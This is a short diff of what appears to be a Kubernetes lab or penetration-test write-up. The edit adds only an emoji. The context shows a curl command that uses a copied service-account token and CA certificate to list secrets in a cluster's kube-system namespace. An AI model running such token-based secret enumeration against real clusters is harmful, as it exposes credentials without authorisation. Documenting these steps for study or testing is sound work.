@@ -230,7 +230,7 @@ We got
 * frankland
 
 **NOTE! This is done from my own machine, with the ca.crt and token copied over**
-
+⚙️
 ```bash
 curl --cacert ca.crt  -H "Authorization: Bearer $(cat token)" https://10.82.180.147:16443/api/v1/namespaces/kube-system/secrets | grep '"name":'
 ```
